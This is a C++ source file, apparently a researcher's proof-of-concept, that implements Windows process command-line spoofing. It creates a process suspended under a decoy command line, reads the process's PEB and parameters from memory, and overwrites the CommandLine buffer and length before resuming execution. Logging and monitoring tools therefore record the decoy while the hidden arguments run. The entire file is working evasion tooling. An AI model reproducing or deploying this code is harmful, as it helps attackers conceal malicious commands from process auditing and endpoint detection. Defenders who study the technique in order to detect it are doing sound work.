// Copyright (c) SecurityResearcher. 2023. All rights reserved.
// Author: REInject
// Date: 2023-02-13

#include "cmd-spoofing.h"

using namespace std;

int main(int argc, char* argv[])
{
	if (argc < 3)
	{
		cout << "Usage: cmd-spoofing.exe \"cmd.exe /c xxxxxxx\" \"cmd.exe /c notepad.exe\"" << endl;
		return 0;
	}
	wstring new_cmdline;
	new_cmdline.resize(strlen(argv[2]) + 2);
	MultiByteToWideChar(CP_UTF8, 0, argv[2], strlen(argv[2]), (LPWSTR)new_cmdline.c_str(), new_cmdline.length());

	string argue_cmdline = argv[1];
	if (new_cmdline.length() > argue_cmdline.length())
	{
		argue_cmdline += ' ';
		auto delta = new_cmdline.length() - argue_cmdline.length();
		argue_cmdline.resize(new_cmdline.length(), '\n');
		new_cmdline.resize(new_cmdline.length() + 1, 0);
	}

	//cout << "[+] target cmdline: " << argv[2] << endl;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	
	memset(&si, 0, sizeof(STARTUPINFOA));
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOA);

	// 创建一个挂起的进程
	if (CreateProcessA(NULL, (LPSTR)argue_cmdline.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE)
	{
		cout << "[!] CreateProcessA error: " << GetLastError() << endl;
		return 0;
	}
	cout << "[+] Created Process ID: " << pi.dwProcessId << endl;

	// 获取进程PEB地址
	PROCESS_BASIC_INFORMATION pbi;
	auto status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	if (!NT_SUCCESS(status))
	{
		cout << "[!] NtQueryInformationProcess error: " << RtlNtStatusToDosError(status) << endl;
		TerminateProcess(pi.hProcess, 0);
		goto cleanup;
	}
	cout << "[+] PEB Address: 0x" << hex << pbi.PebBaseAddress << dec << endl;

	// 读取 PEB
	PEB peb;
	if (ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL) == FALSE)
	{
		cout << "[!] Read PEB error: " << GetLastError() << endl;
		TerminateProcess(pi.hProcess, 0);
		goto cleanup;
	}
	cout << "[+] PEB->ProcessParameters: 0x" << hex << peb.ProcessParameters << dec << endl;
	printf("[+] PEB->ProcessParameters: %p\n", peb.ProcessParameters);

	// 读取当前进程命令行
	RTL_USER_PROCESS_PARAMETERS params;
	if (ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &params, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL) == FALSE)
	{
		cout << "[!] Read PEB->ProcessParameters error: " << GetLastError() << endl;
		TerminateProcess(pi.hProcess, 0);
		goto cleanup;
	}
	cout << "[+] CommandLine Buffer Address: 0x" << hex << (void *)params.CommandLine.Buffer << dec << endl;
	{
		wstring cmdline_buffer;
		cmdline_buffer.resize(params.CommandLine.Length / 2);
		if (ReadProcessMemory(pi.hProcess, params.CommandLine.Buffer, (LPVOID)cmdline_buffer.c_str(), params.CommandLine.Length, NULL) == FALSE)
		{
			cout << "[!] Read PEB->ProcessParameters->CommandLine.Buffer error: " << GetLastError() << endl;
			TerminateProcess(pi.hProcess, 0);
			goto cleanup;
		}
		if (cmdline_buffer.find(L'\n') != string::npos)
		{
			cmdline_buffer.resize(cmdline_buffer.find(L'\n'));
		}
		wcout << "[+] Current CommandLine: " << cmdline_buffer << endl;

		// 修改命令行
		// [FIXME] Free 原来的 Buffer 后重新创建新命令行字符串长度的 Buffer 内存，这块内存需要在堆上，暂时做不到远程调用HeapAlloc，而且进程恢复之后堆基址会变化
		//			当新命令行比原始命令行长度长时就会覆盖掉后面的内存，最先覆盖的是WindowTitle
		if (WriteProcessMemory(pi.hProcess, params.CommandLine.Buffer, new_cmdline.c_str(), new_cmdline.length() * sizeof(WCHAR), NULL) == FALSE)
		{
			cout << "[!] Error to write new commandline buffer to target process: " << GetLastError() << endl;
			TerminateProcess(pi.hProcess, 0);
			goto cleanup;
		}
		auto new_cmd_len = new_cmdline.length() * 2;
		/*auto new_cmdline_buffer = VirtualAllocEx(pi.hProcess, peb.ProcessParameters, new_cmd_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (new_cmdline_buffer == NULL)
		{
			cout << "[!] Error to alloc new commandline buffer: " << GetLastError() << endl;
			TerminateProcess(pi.hProcess, 0);
			goto cleanup;
		}*/

		//MEMORY_BASIC_INFORMATION mbi;
		//if (VirtualQueryEx(pi.hProcess, peb.ProcessParameters, &mbi, sizeof(MEMORY_BASIC_INFORMATION)) == 0)
		//{
		//	cout << "[!] VirtualQueryEx error: " << GetLastError() << endl;
		//	TerminateProcess(pi.hProcess, 0);
		//	goto cleanup;
		//}
		//auto new_cmdline_buffer = (LPVOID)((size_t)mbi.BaseAddress + mbi.RegionSize - new_cmd_len - 2);

		//cout << "[+] New cmdline buffer: 0x" << hex << new_cmdline_buffer << dec << endl;
		//if (WriteProcessMemory(pi.hProcess, new_cmdline_buffer, new_cmdline.c_str(), new_cmd_len, NULL) == FALSE)
		//{
		//	cout << "[!] Error to write new cmdline buffer: " << GetLastError() << endl;
		//	TerminateProcess(pi.hProcess, 0);
		//	goto cleanup;
		//}
		//cout << hex << (ULONG_PTR)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer) << dec << endl;
		//if (WriteProcessMemory(pi.hProcess, (char *)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Buffer), &new_cmdline_buffer, sizeof(LPVOID), NULL) == FALSE)
		//{
		//	cout << "[!] Error to change commandline buffer to new buffer: " << GetLastError() << endl;
		//	TerminateProcess(pi.hProcess, 0);
		//	goto cleanup;
		//}
		if (WriteProcessMemory(pi.hProcess, (char *)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), &new_cmd_len, sizeof(USHORT), NULL) == FALSE)
		{
			cout << "[!] Error to write new commandline length to target process: " << GetLastError() << endl;
			TerminateProcess(pi.hProcess, 0);
			goto cleanup;
		}
		wcout << "[+] New CommandLine: " << new_cmdline << endl;

		cout << "[+] Resume process execution" << endl;
		//system("pause");
		ResumeThread(pi.hThread);
		cout << "[+] Done!!" << endl;
	}

cleanup:
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return 0;
}
